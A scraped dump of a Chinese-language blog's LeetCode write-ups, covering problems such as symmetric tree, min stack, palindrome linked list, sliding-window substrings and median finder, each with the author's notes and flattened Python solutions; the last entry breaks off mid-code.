複習bfs\nProblem Given the root of a binary tree, check whether it is a mirror of itself (i.e., symmetric around its center).\nExample 1:\nInput: root = [1,2,2,3,4,4,3]Output: trueExample 2:\nInput: root = [1,2,2,null,3,null,3]Output: false Constraints:\nThe number of nodes in the tree is in the range [1, 1000].-100 \u003c= Node.val \u003c= 100 Follow up: Could you solve it both recursively and iteratively? Sol class Solution: def isSymmetric(self, root: TreeNode) -\u0026gt; bool: def sym(rs): if not rs: return False else: rs = [x.val if x else None for x in rs] return rs == list(reversed(rs)) q = deque([[root]]) while q: rs = q.popleft() #print([x.val if x else None for x in rs]) if sym(rs): ret = [] for r in rs: ret += [r.left,r.right] if r else [] if ret: # IMPORTANT!!! q.append(ret) else: return False return True ","permalink":"https://littlebees.github.io/2021/07/leetcode-101-symmetric-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習bfs\u003c/p\u003e","title":"leetcode-101 - Symmetric Tree"},{"content":"動機 複習minstk\nProblem Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.\nImplement the MinStack class:\nMinStack() initializes the stack object.void push(val) pushes the element val onto the stack.void pop() removes the element on the top of the stack.int top() gets the top element of the stack.int getMin() retrieves the minimum element in the stack. Example 1:\nInput[MinStack,push,push,push,getMin,pop,top,getMin][[],[-2],[0],[-3],[],[],[],[]]Output[null,null,null,null,-3,null,0,-2]ExplanationMinStack minStack = new MinStack();minStack.push(-2);minStack.push(0);minStack.push(-3);minStack.getMin(); // return -3minStack.pop();minStack.top(); // return 0minStack.getMin(); // return -2 Constraints:\n-231 \u003c= val \u003c= 231 - 1Methods pop, top and getMin operations will always be called on non-empty stacks.At most 3 * 104 calls will be made to push, pop, top, and getMin. Sol stk同時放目前最小值\nclass MinStack: def __init__(self): self.stk = [] def push(self, val: int) -\u0026gt; None: if not self.stk: self.stk.append([val,val]) else: self.stk.append([val, val if val \u0026lt; self.getMin() else self.getMin()]) def pop(self) -\u0026gt; None: self.stk.pop() def top(self) -\u0026gt; int: return self.stk[-1][0] def getMin(self) -\u0026gt; int: return self.stk[-1][1] ","permalink":"https://littlebees.github.io/2021/07/leetcode-155-min-stack/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習minstk\u003c/p\u003e","title":"leetcode-155 - Min Stack"},{"content":"動機 沒有魔法的一題\nProblem Given an integer array nums and an integer k, return the kth largest element in the array.\nNote that it is the kth largest element in the sorted order, not the kth distinct element.\nExample 1:\nInput: nums = [3,2,1,5,6,4], k = 2Output: 5Example 2:\nInput: nums = [3,2,3,1,2,4,5,5,6], k = 4Output: 4 Constraints:\n1 \u003c= k \u003c= nums.length \u003c= 104-104 \u003c= nums[i] \u003c= 104 Sol 最直接的方法是排序或是heap\nimport heapq as hq class Solution: def findKthLargest(self, nums: List[int], kkk: int) -\u0026gt; int: h = [] for n in nums: hq.heappush(h,-n) ret = 0 for _ in range(0,kkk): ret = hq.heappop(h) return -ret 還有quick select，但是會改list，我是不太喜歡啦\n","permalink":"https://littlebees.github.io/2021/07/leetcode-215-kth-largest-element-in-an-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e沒有魔法的一題\u003c/p\u003e","title":"leetcode-215 - Kth Largest Element in an Array"},{"content":"動機 可以去看143 重點是找中點時判斷長度的奇偶姓!!\nProblem Given the head of a singly linked list, return true if it is a palindrome.\nExample 1:\nInput: head = [1,2,2,1]Output: trueExample 2:\nInput: head = [1,2]Output: false Constraints:\nThe number of nodes in the list is in the range [1, 105].0 \u003c= Node.val \u003c= 9 Follow up: Could you do it in O(n) time and O(1) space? Sol 找中點，reverse，compare\nclass Solution: def isPalindrome(self, head: ListNode) -\u0026gt; bool: if not head.next: return True # mid mid,b = head,head while b.next and b.next.next: mid,b = mid.next,b.next.next right = mid.next # 1,2 b.n.n is None # 1,2,3 b.n is None # 1,2,3,4 b.n.n is None isodd = (b.next is None) # rev right now, nextN = right, right.next while nextN: tmp = nextN.next nextN.next = now now, nextN = nextN, tmp right.next = None right = now mid.next = right leftEnd = mid if isodd else right # comp while head != leftEnd: if head.val != right.val: return False head, right = head.next, right.next return True ","permalink":"https://littlebees.github.io/2021/07/leetcode-234-palindrome-linked-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e可以去看\u003ca href=\"/2021/07/leetcode-143\"\u003e143\u003c/a\u003e\n重點是找中點時判斷長度的奇偶姓!!\u003c/p\u003e","title":"leetcode-234 - Palindrome Linked List"},{"content":"動機 複習saddle back\nProblem Write an efficient algorithm that searches for a target value in an m x n integer matrix. The matrix has the following properties:\nIntegers in each row are sorted in ascending from left to right.Integers in each column are sorted in ascending from top to bottom. Example 1:\nInput: matrix = [[1,4,7,11,15],[2,5,8,12,19],[3,6,9,16,22],[10,13,14,17,24],[18,21,23,26,30]], target = 5Output: trueExample 2:\nInput: matrix = [[1,4,7,11,15],[2,5,8,12,19],[3,6,9,16,22],[10,13,14,17,24],[18,21,23,26,30]], target = 20Output: false Constraints:\nm == matrix.lengthn == matrix[i].length1 \u003c= n, m \u003c= 300-109 \u003c= matix[i][j] \u003c= 109All the integers in each row are sorted in ascending order.All the integers in each column are sorted in ascending order.-109 \u003c= target \u003c= 109 Sol 詳細去看saddleback-search-algorithm\nclass Solution: def searchMatrix(self, ms: List[List[int]], val: int) -\u0026gt; bool: a,b = len(ms)-1,0 while 0 \u0026lt;= a \u0026lt; len(ms) and 0 \u0026lt;= b \u0026lt; len(ms[a]): if ms[a][b] == val: return True elif ms[a][b] \u0026lt; val: b += 1 else: a -= 1 return False ","permalink":"https://littlebees.github.io/2021/07/leetcode-240-search-a-2d-matrix-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習saddle back\u003c/p\u003e","title":"leetcode-240 - Search a 2D Matrix II"},{"content":"動機 複習換硬幣的dp isqrt是個很貴的運算\nProblem Given an integer n, return the least number of perfect square numbers that sum to n.\nA perfect square is an integer that is the square of an integer; in other words, it is the product of some integer with itself. For example, 1, 4, 9, and 16 are perfect squares while 3 and 11 are not.\nExample 1:\nInput: n = 12Output: 3Explanation: 12 = 4 + 4 + 4.Example 2:\nInput: n = 13Output: 2Explanation: 13 = 4 + 9. Constraints:\n1 \u003c= n \u003c= 104 Sol isqrt是個很貴的運算，所以要先把硬幣算完，再跑dp\nclass Solution: def numSquares(self, n: int) -\u0026gt; int: cs = set([x**2 for x in range(isqrt(n),0,-1)]) @cache def dp(n): if n in cs: return 1 else: ret = float(\u0026#39;inf\u0026#39;) for x in cs: if n-x \u0026gt; 0: ret = min(ret, dp(n-x)+1) return ret return dp(n) ","permalink":"https://littlebees.github.io/2021/07/leetcode-279-perfect-squares/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習換硬幣的dp\nisqrt是個很貴的運算\u003c/p\u003e","title":"leetcode-279 - Perfect Squares"},{"content":"動機 這題有很多有趣的解法\nProblem Given an array of integers nums containing n + 1 integers where each integer is in the range [1, n] inclusive.\nThere is only one repeated number in nums, return this repeated number.\nYou must solve the problem without modifying the array nums and uses only constant extra space.\nExample 1:\nInput: nums = [1,3,4,2,2]Output: 2Example 2:\nInput: nums = [3,1,3,4,2]Output: 3Example 3:\nInput: nums = [1,1]Output: 1Example 4:\nInput: nums = [1,1,2]Output: 1 Constraints:\n1 \u003c= n \u003c= 105nums.length == n + 11 \u003c= nums[i] \u003c= nAll the integers in nums appear only once except for precisely one integer which appears two or more times. Follow up:\nHow can we prove that at least one duplicate number must exist in nums?Can you solve the problem in linear runtime complexity? Sol 第一個是bsearch\n去猜數字\nclass Solution: def findDuplicate(self, ns: List[int]) -\u0026gt; int: a,b = 1, len(ns)+1 while a\u0026lt;b: mid = (a+b)//2 # 猜數字 cnt, has_num = 0, False for n in ns: if n \u0026lt;= mid: if n == mid: has_num = True cnt += 1 if cnt == mid and has_num or cnt \u0026lt; mid: a = mid+1 elif cnt \u0026gt;= mid: b = mid return a 第二個是找loop的起點 (這真的沒想到)\nclass Solution: def findDuplicate(self, nums): # Find the intersection point of the two runners. tortoise = hare = nums[0] while True: tortoise = nums[tortoise] hare = nums[nums[hare]] if tortoise == hare: break # Find the \u0026#34;entrance\u0026#34; to the cycle. tortoise = nums[0] while tortoise != hare: tortoise = nums[tortoise] hare = nums[hare] return hare 第三個是利用1~n的特性把數字放到對應的index上\nclass Solution: def findDuplicate(self, nums: List[int]) -\u0026gt; int: while nums[0] != nums[nums[0]]: nums[nums[0]], nums[0] = nums[0], nums[nums[0]] return nums[0] ","permalink":"https://littlebees.github.io/2021/07/leetcode-287-find-the-duplicate-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題有很多有趣的解法\u003c/p\u003e","title":"leetcode-287 - Find the Duplicate Number"},{"content":"動機 lowerbound與upperbound只差一個等號!!\nProblem Given an array of integers nums sorted in ascending order, find the starting and ending position of a given target value.\nIf target is not found in the array, return [-1, -1].\nYou must write an algorithm with O(log n) runtime complexity.\nExample 1:\nInput: nums = [5,7,7,8,8,10], target = 8Output: [3,4]Example 2:\nInput: nums = [5,7,7,8,8,10], target = 6Output: [-1,-1]Example 3:\nInput: nums = [], target = 0Output: [-1,-1] Constraints:\n0 \u003c= nums.length \u003c= 105-109 \u003c= nums[i] \u003c= 109nums is a non-decreasing array.-109 \u003c= target \u003c= 109 Sol class Solution: def searchRange(self, ns: List[int], val: int) -\u0026gt; List[int]: def lower(n): a,b = 0,len(ns) while a\u0026lt;b: mid = (a+b)//2 if ns[mid] \u0026gt;= n: b = mid else: a = mid+1 return a def wierd_upper(n): a,b = 0,len(ns) while a\u0026lt;b: mid = (a+b)//2 if ns[mid] \u0026gt; n: b = mid else: a = mid+1 return a-1 a,b = lower(val),wierd_upper(val) a,b = (a if 0 \u0026lt;= a \u0026lt; len(ns) and ns[a] == val else -1), (b if 0 \u0026lt;= b \u0026lt; len(ns) and ns[b] == val else -1) return [a,b] ","permalink":"https://littlebees.github.io/2021/07/leetcode-34-find-first-and-last-position-of-element-in-sorted-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003elowerbound與upperbound只差一個等號!!\u003c/p\u003e","title":"leetcode-34 - Find First and Last Position of Element in Sorted Array"},{"content":"動機 複習backtrack\nProblem Given a string containing digits from 2-9 inclusive, return all possible letter combinations that the number could represent. Return the answer in any order.\nA mapping of digit to letters (just like on the telephone buttons) is given below. Note that 1 does not map to any letters.\nExample 1:\nInput: digits = 23Output: [ad,ae,af,bd,be,bf,cd,ce,cf]Example 2:\nInput: digits = Output: []Example 3:\nInput: digits = 2Output: [a,b,c] Constraints:\n0 \u003c= digits.length \u003c= 4digits[i] is a digit in the range ['2', '9']. Sol tbl = {} tbl[\u0026#39;2\u0026#39;] = list(\u0026#34;abc\u0026#34;) tbl[\u0026#39;3\u0026#39;] = list(\u0026#34;def\u0026#34;) tbl[\u0026#39;4\u0026#39;] = list(\u0026#34;ghi\u0026#34;) tbl[\u0026#39;5\u0026#39;] = list(\u0026#34;jkl\u0026#34;) tbl[\u0026#39;6\u0026#39;] = list(\u0026#34;mno\u0026#34;) tbl[\u0026#39;7\u0026#39;] = list(\u0026#34;pqrs\u0026#34;) tbl[\u0026#39;8\u0026#39;] = list(\u0026#34;tuv\u0026#34;) tbl[\u0026#39;9\u0026#39;] = list(\u0026#34;wxyz\u0026#34;) class Solution: def letterCombinations(self, ds: str) -\u0026gt; List[str]: def dfs(i,acc): if i == len(ds): return [acc] else: return list(reduce(lambda ret,x: ret+dfs(i+1,acc+x), tbl[ds[i]],[])) if ds: return dfs(0,\u0026#34;\u0026#34;) else: return [] ","permalink":"https://littlebees.github.io/2021/07/leetcode-17-letter-combinations-of-a-phone-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習backtrack\u003c/p\u003e","title":"leetcode-17 - Letter Combinations of a Phone Number"},{"content":"動機 XOR!!\nProblem Given a non-empty array of integers nums, every element appears twice except for one. Find that single one.\nYou must implement a solution with a linear runtime complexity and use only constant extra space.\nExample 1:\nInput: nums = [2,2,1]Output: 1Example 2:\nInput: nums = [4,1,2,1,2]Output: 4Example 3:\nInput: nums = [1]Output: 1 Constraints:\n1 \u003c= nums.length \u003c= 3 * 104-3 * 104 \u003c= nums[i] \u003c= 3 * 104Each element in the array appears twice except for one element which appears only once. Sol ((a xor b) xor b) == a\nxor兩次就是不變!!\nclass Solution: def singleNumber(self, nums: List[int]) -\u0026gt; int: a = 0 for i in nums: a ^= i return a ","permalink":"https://littlebees.github.io/2021/07/leetcode-136-single-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eXOR!!\u003c/p\u003e","title":"leetcode-136 - Single Number"},{"content":"動機 這種copy有ptr的都要另外存新複製的node\nProblem A linked list of length n is given such that each node contains an additional random pointer, which could point to any node in the list, or null.\nConstruct a deep copy of the list. The deep copy should consist of exactly n brand new nodes, where each new node has its value set to the value of its corresponding original node. Both the next and random pointer of the new nodes should point to new nodes in the copied list such that the pointers in the original list and copied list represent the same list state. None of the pointers in the new list should point to nodes in the original list.\nFor example, if there are two nodes X and Y in the original list, where X.random --\u003e Y, then for the corresponding two nodes x and y in the copied list, x.random --\u003e y.\nReturn the head of the copied linked list.\nThe linked list is represented in the input/output as a list of n nodes. Each node is represented as a pair of [val, random_index] where:\nval: an integer representing Node.valrandom_index: the index of the node (range from 0 to n-1) that the random pointer points to, or null if it does not point to any node.Your code will only be given the head of the original linked list.\nExample 1:\nInput: head = [[7,null],[13,0],[11,4],[10,2],[1,0]]Output: [[7,null],[13,0],[11,4],[10,2],[1,0]]Example 2:\nInput: head = [[1,1],[2,1]]Output: [[1,1],[2,1]]Example 3:\nInput: head = [[3,null],[3,0],[3,null]]Output: [[3,null],[3,0],[3,null]]Example 4:\nInput: head = []Output: []Explanation: The given linked list is empty (null pointer), so return null. Constraints:\n0 \u003c= n \u003c= 1000-10000 \u003c= Node.val \u003c= 10000Node.random is null or is pointing to some node in the linked list. Sol class Solution: def copyRandomList(self, head: \u0026#39;Node\u0026#39;) -\u0026gt; \u0026#39;Node\u0026#39;: if not head: return None cur = head tbl = {} while cur: tbl[cur] = Node(cur.val) cur = cur.next cur = head while cur: if cur.random: tbl[cur].random = tbl[cur.random] if cur.next: tbl[cur].next = tbl[cur.next] cur = cur.next return tbl[head] ","permalink":"https://littlebees.github.io/2021/07/leetcode-138-copy-list-with-random-pointer/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這種copy有ptr的都要另外存新複製的node\u003c/p\u003e","title":"leetcode-138 - Copy List with Random Pointer"},{"content":"動機 要用dfs(+dp)要注意會不會重複走\nProblem There is an m x n rectangular island that borders both the Pacific Ocean and Atlantic Ocean. The Pacific Ocean touches the island's left and top edges, and the Atlantic Ocean touches the island's right and bottom edges.\nThe island is partitioned into a grid of square cells. You are given an m x n integer matrix heights where heights[r][c] represents the height above sea level of the cell at coordinate (r, c).\nThe island receives a lot of rain, and the rain water can flow to neighboring cells directly north, south, east, and west if the neighboring cell's height is less than or equal to the current cell's height. Water can flow from any cell adjacent to an ocean into the ocean.\nReturn a 2D list of grid coordinates result where result[i] = [ri, ci] denotes that rain water can flow from cell (ri, ci) to both the Pacific and Atlantic oceans.\nExample 1:\nInput: heights = [[1,2,2,3,5],[3,2,3,4,4],[2,4,5,3,1],[6,7,1,4,5],[5,1,1,2,4]]Output: [[0,4],[1,3],[1,4],[2,2],[3,0],[3,1],[4,0]]Example 2:\nInput: heights = [[2,1],[1,2]]Output: [[0,0],[0,1],[1,0],[1,1]] Constraints:\nm == heights.lengthn == heights[r].length1 \u003c= m, n \u003c= 2000 \u003c= heights[r][c] \u003c= 105 Sol 當初腦袋撞到，一直想用dp去做，但不是不能用dp做，不過用記憶法不好做 要\n因為要處理重複走的問題\n如果dfs不行，我們還有bfs!!\nclass Solution: # 如果要用dfs(+dp)要注意會不會重複走，如果會就很麻煩 # 同樣是搜尋所有可能性可以用bfs，尤其是起點或終點已經確定的更是如此 def pacificAtlantic(self, hs: List[List[int]]) -\u0026gt; List[List[int]]: def legal(x,y): return 0 \u0026lt;= x \u0026lt; len(hs) and 0 \u0026lt;= y \u0026lt; len(hs[x]) def bfs(starts): q,vis = deque(starts),set(starts) while q: (i,j) = q.popleft() dirs = [(i+1,j),(i,j+1),(i-1,j),(i,j-1)] dirs = [(x,y) for (x,y) in dirs if legal(x,y) and (x,y) not in vis and hs[i][j] \u0026lt;= hs[x][y]] for xy in dirs: q.append(xy) vis.add(xy) return vis if hs: p = [(0,j) for j in range(len(hs[0]))] + [(i,0) for i in range(len(hs))] a = [(len(hs)-1,j) for j in range(len(hs[0]))] + [(i,len(hs[i])-1) for i in range(len(hs))] return bfs(p) \u0026amp; bfs(a) else: return [] ","permalink":"https://littlebees.github.io/2021/07/leetcode-417-pacific-atlantic-water-flow/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要用dfs(+dp)要注意會不會重複走\u003c/p\u003e","title":"leetcode-417 - Pacific Atlantic Water Flow"},{"content":"動機 lee215太神啦!!\nProblem You are given a string s and an integer k. You can choose any character of the string and change it to any other uppercase English character. You can perform this operation at most k times.\nReturn the length of the longest substring containing the same letter you can get after performing the above operations.\nExample 1:\nInput: s = ABAB, k = 2Output: 4Explanation: Replace the two 'A's with two 'B's or vice versa.Example 2:\nInput: s = AABABBA, k = 1Output: 4Explanation: Replace the one 'A' in the middle with 'B' and form AABBBBA.The substring BBBB has the longest repeating letters, which is 4. Constraints:\n1 \u003c= s.length \u003c= 105s consists of only uppercase English letters.0 \u003c= k \u003c= s.length Sol 當初腦袋撞到，一直想用dp去做，但做下去會發現如果要遞迴勢必要知道要換成什麼字，這樣維度就會上升\n之後才想起來sliding windows 先加大到剛好出事，之後再扣一位\ndef legal(tbl,k): big = tbl.most_common(1)[0][1] ks = sum(tbl.values()) return ks-big \u0026lt;= k class Solution: def characterReplacement(self, s: str, k: int) -\u0026gt; int: ret,a,b,tbl = 0,0,1,Counter(s[0]) while a \u0026lt; len(s): # expand while b \u0026lt; len(s) and legal(tbl,k): tbl.update(s[b]) ret = max(ret, b-a) # 只要是合法的地方都要收集值 \u0026#34;AAAB\u0026#34; 0 b += 1 if b \u0026lt; len(s): tbl.subtract(s[b-1]) b -= 1 print(a,b) if legal(tbl,k): ret = max(ret, b-a) tbl.subtract(s[a]) a += 1 return ret 之後看到了很神的寫法，同樣用一個dict紀錄windows的內容物 總長度 = 最多的字 + 其他字而其他字的長度不能大於k\n之後就是一路往前，當出事是就移動一格\n為什麼不是移動到合法為止? 就算是合法也不會比之前看到的長，如果之後有合法的，也會比現在調整完的合法長\n另外，合法的可能性很大，就算真的違法，只要往後找到一堆一樣的就直接合法了!!\n這邊還有一個地方是它是在違法時才更新!!\n太聰明啦!!\nclass Solution: def characterReplacement(self, s: str, k: int) -\u0026gt; int: start, res = 0, 0 dict = collections.defaultdict(int) for i in range (len(s)): dict[s[i]] += 1 if max(dict.values()) \u0026lt; i-start+1-k: res = max(res, i-start) dict[s[start]] -= 1 start += 1 return max(res, len(s)-start) 之後寫了兩個版本\nclass Solution: def characterReplacement(self, s: str, k: int) -\u0026gt; int: ret,a,tbl = 0,0,defaultdict(int) for b in range(len(s)): tbl[s[b]]+=1 if max(tbl.values()) \u0026lt; b-a+1-k: ret = max(ret, b-a) tbl[s[a]]-=1 a += 1 return max(ret,b-a+1) class Solution: def characterReplacement(self, s: str, k: int) -\u0026gt; int: ret,a,tbl = 0,0,Counter() for b in range(len(s)): tbl.update(s[b]) if max(tbl.values()) \u0026lt; b-a+1-k: ret = max(ret, b-a) tbl.subtract(s[a]) a += 1 return max(ret,b-a+1) Counter的硬是比dict慢一倍以上\n","permalink":"https://littlebees.github.io/2021/07/leetcode-424-longest-repeating-character-replacement/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003elee215太神啦!!\u003c/p\u003e","title":"leetcode-424 - Longest Repeating Character Replacement"},{"content":"動機 沒想到可以用reverse!!\nProblem You are given the head of a singly linked-list. The list can be represented as:\nL0 → L1 → … → Ln - 1 → LnReorder the list to be on the following form:\nL0 → Ln → L1 → Ln - 1 → L2 → Ln - 2 → …You may not modify the values in the list's nodes. Only nodes themselves may be changed.\nExample 1:\nInput: head = [1,2,3,4]Output: [1,4,2,3]Example 2:\nInput: head = [1,2,3,4,5]Output: [1,5,2,4,3] Constraints:\nThe number of nodes in the list is in the range [1, 5 * 104].1 \u003c= Node.val \u003c= 1000 Sol 求中點之後有左右兩邊，就開始塞 不過因為右邊是反的，就用遞迴後半段去塞，不然就是reverse\nclass Solution: def getMid(self,h): n, e = h,h odd = False while e.next and e.next.next: n,e = n.next, e.next.next return [n, e.next is None] def reorderList(self, head: ListNode) -\u0026gt; None: mid, odd = self.getMid(head) right, leftEnd = (mid.next, mid) if odd else (mid.next,mid.next) def bt(now): nonlocal right if now is leftEnd: return else: bt(now.next) #print(now.val, right.val) nextRight, nextNow = right.next, now.next now.next, right.next = right, nextNow right = nextRight if leftEnd is not None: bt(head) leftEnd.next = None ","permalink":"https://littlebees.github.io/2021/07/leetcode-143-reorder-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e沒想到可以用reverse!!\u003c/p\u003e","title":"leetcode-143 - Reorder List"},{"content":"動機 現在寫sliding window的風格跟以前完全不一樣\nProblem Given two strings s and t of lengths m and n respectively, return the minimum window substring of s such that every character in t (including duplicates) is included in the window. If there is no such substring, return the empty string .\nThe testcases will be generated such that the answer is unique.\nA substring is a contiguous sequence of characters within the string.\nExample 1:\nInput: s = ADOBECODEBANC, t = ABCOutput: BANCExplanation: The minimum window substring BANC includes 'A', 'B', and 'C' from string t.Example 2:\nInput: s = a, t = aOutput: aExplanation: The entire string s is the minimum window.Example 3:\nInput: s = a, t = aaOutput: Explanation: Both 'a's from t must be included in the window.Since the largest window of s only has one 'a', return empty string. Constraints:\nm == s.lengthn == t.length1 \u003c= m, n \u003c= 105s and t consist of uppercase and lowercase English letters. Follow up: Could you find an algorithm that runs in O(m + n) time? Sol 先看之前寫的再看別人寫的\n一路長到合法，紀錄，縮一格\n但因為檢查合法的方式是dict比對，所以超慢\ndef lt(a,b): return any([a.get(k,0) \u0026lt; b[k] for k in b.keys()]) def gt_or_eq(a,b): return all([a.get(k,0) \u0026gt;= b[k] for k in b.keys()]) class Solution: def minWindow(self, s: str, t: str) -\u0026gt; str: a,b,seen,t = 0,0, Counter(), Counter(t) x,y = -1,-1 while a \u0026lt; len(s): while b \u0026lt; len(s) and lt(seen,t): if s[b] in t: seen.update(s[b]) b += 1 #print(\u0026#34;expand\u0026#34;,a,b,s[a:b]) while a \u0026lt; b: if s[a] not in t: a += 1 elif seen[s[a]]-1 \u0026gt;= t[s[a]]: seen.subtract(s[a]) a += 1 else: break #print(\u0026#34;shrink\u0026#34;,a,b,s[a:b]) updateXY, legal = (x == -1 or b-a \u0026lt; y-x), gt_or_eq(seen,t) # 做array操作之前要把前提檢查一遍 x,y = (a,b) if updateXY and legal else (x,y) if a \u0026lt; len(s): seen.subtract(s[a]) a+=1 return s[x:y] 看別人寫的，用t的counter去扣，如果不在t中就會是負的，之後就是用一個cnt去看，有多少char已經收集好了，等到了，就可以用window的index求len\nclass Solution: def minWindow(self, s: str, t: str) -\u0026gt; str: dict_t_cnt = Counter(t) left = right = cnt = 0 # cnt control the valid charater in the window minlen = float(\u0026#39;inf\u0026#39;) res = \u0026#34;\u0026#34; # the window is build upon the string s for right in range(len(s)): dict_t_cnt[s[right]] -= 1 if dict_t_cnt[s[right]] \u0026gt;= 0: cnt += 1 # if it is less than zero, means the window has enough charater s[right] while cnt == len(t): if minlen \u0026gt; right - left + 1: minlen = right - left + 1 res = s[left : right + 1] dict_t_cnt[s[left]] += 1 if dict_t_cnt[s[left]] \u0026gt; 0: cnt -= 1 left += 1 return res 現在的風格\nclass Solution: def minWindow(self, s: str, t: str) -\u0026gt; str: cs = set(t) limit = Counter(t) win = defaultdict(int) i,ret = 0,float(\u0026#39;inf\u0026#39;) ans = \u0026#34;\u0026#34; for j,c in enumerate(s): win[c] += 1 while i\u0026lt;=j and all([win[x] \u0026gt;= limit[x] for x in cs]): if ret \u0026gt; j-i+1: ret, ans = j-i+1, s[i:j+1] win[s[i]] -= 1 i += 1 return ans ","permalink":"https://littlebees.github.io/2021/07/leetcode-76-minimum-window-substring/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e現在寫sliding window的風格跟以前完全不一樣\u003c/p\u003e","title":"leetcode-76 - Minimum Window Substring"},{"content":"動機 寫解題心得才意識到，這就是與two pointer很像\nProblem The median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value and the median is the mean of the two middle values.\nFor example, for arr = [2,3,4], the median is 3.For example, for arr = [2,3], the median is (2 + 3) / 2 = 2.5.Implement the MedianFinder class:\nMedianFinder() initializes the MedianFinder object.void addNum(int num) adds the integer num from the data stream to the data structure.double findMedian() returns the median of all elements so far. Answers within 10-5 of the actual answer will be accepted. Example 1:\nInput[MedianFinder, addNum, addNum, findMedian, addNum, findMedian][[], [1], [2], [], [3], []]Output[null, null, null, 1.5, null, 2.0]ExplanationMedianFinder medianFinder = new MedianFinder();medianFinder.addNum(1); // arr = [1]medianFinder.addNum(2); // arr = [1, 2]medianFinder.findMedian(); // return 1.5 (i.e., (1 + 2) / 2)medianFinder.addNum(3); // arr[1, 2, 3]medianFinder.findMedian(); // return 2.0 Constraints:\n-105 \u003c= num \u003c= 105There will be at least one element in the data structure before calling findMedian.At most 5 * 104 calls will be made to addNum and findMedian. Follow up:\nIf all integer numbers from the stream are in the range [0, 100], how would you optimize your solution?If 99% of all integer numbers from the stream are in the range [0, 100], how would you optimize your solution? Sol MaxHeap放小的數字，pop會拿到大的最小 MinHeap放大的數字，pop會拿到小的最大\n這樣就能調整大小\nclass MaxHeap: def __init__(self): self.hq = [] def append(self,val): heapq.heappush(self.hq,-val) def top(self): return -self.hq[0] def pop(self): return -heapq.heappop(self.hq) def __len__(self): return len(self.hq) class MinHeap: def __init__(self): self.hq = [] def append(self,val): heapq.heappush(self.hq,val) def top(self): return self.hq[0] def pop(self): return heapq.heappop(self.hq) def __len__(self): return len(self.hq) class MedianFinder: def __init__(self): self.minq, self.maxq = MinHeap(), MaxHeap() # premise: 0 \u0026lt;= len(maxq) - len(minq) \u0026lt;= 1 def addNum(self, num: int) -\u0026gt; None: if len(self.minq) \u0026gt; 0 and self.minq.top() \u0026lt; num: self.minq.append(num) else: self.maxq.append(num) while len(self.maxq) - len(self.minq) \u0026gt; 1 or len(self.maxq) \u0026lt; len(self.minq): while len(self.minq) \u0026gt; len(self.maxq): self.maxq.append(self.minq.pop()) while len(self.maxq) - len(self.minq) \u0026gt; 1: self.minq.append(self.maxq.pop()) #print(\u0026#34;add\u0026#34;,self.minq.hq, self.maxq.hq) def findMedian(self) -\u0026gt; float: #print(\u0026#34;mid\u0026#34;,self.minq.hq, self.maxq.hq) if len(self.minq) == len(self.maxq): return (self.minq.top()+self.maxq.top())/2 else: return self.maxq.top() ","permalink":"https://littlebees.github.io/2021/07/leetcode-295-find-median-from-data-stream/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e寫解題心得才意識到，這就是與two pointer很像\u003c/p\u003e","title":"leetcode-295 - Find Median from Data Stream"},{"content":"動機 LIS的進化版\nProblem Given an integer array nums, find a contiguous non-empty subarray within the array that has the largest product, and return the product.\nIt is guaranteed that the answer will fit in a 32-bit integer.\nA subarray is a contiguous subsequence of the array.\nExample 1:\nInput: nums = [2,3,-2,4]Output: 6Explanation: [2,3] has the largest product 6.Example 2:\nInput: nums = [-2,0,-1]Output: 0Explanation: The result cannot be 2, because [-2,-1] is not a subarray. Constraints:\n1 \u003c= nums.length \u003c= 2 * 104-10 \u003c= nums[i] \u003c= 10The product of any prefix or suffix of nums is guaranteed to fit in a 32-bit integer. Sol 與原本的LIS很像，但有負數!! 所以要記錄最小的數\nclass Solution: def maxProduct(self, nums: List[int]) -\u0026gt; int: ret = a = b = nums[0] for n in nums[1:]: a,b = max(a*n,b*n,n), min(a*n,b*n,n) ret = max(ret, a, b) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-152-maximum-product-subarray/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eLIS的進化版\u003c/p\u003e","title":"leetcode-152 - Maximum Product Subarray"},{"content":"動機 令人回想到73 如果找不到範圍就先看看怎麼定義頭吧\nProblem Given an unsorted array of integers nums, return the length of the longest consecutive elements sequence.\nYou must write an algorithm that runs in O(n) time.\nExample 1:\nInput: nums = [100,4,200,1,3,2]Output: 4Explanation: The longest consecutive elements sequence is [1, 2, 3, 4]. Therefore its length is 4.Example 2:\nInput: nums = [0,3,7,2,5,8,4,6,0,1]Output: 9 Constraints:\n0 \u003c= nums.length \u003c= 105-109 \u003c= nums[i] \u003c= 109 Sol 用set去存所有數字不難，但是怎麼找出sequence就會頭痛了\n會頭痛是因為不知道怎麼找出sequence的範圍，如果列舉每個數字去找最大長度，會有許多重複計算\n如果是sequence會有頭與尾\n那要找頭還是尾? 其實都可以，下面是找頭\n這讓我想起73把第一行與列當成mark sheet來用\nclass Solution: def longestConsecutive(self, nums): nums = set(nums) ret = 0 for n in nums: if n-1 not in nums: tmp = 1 while n+1 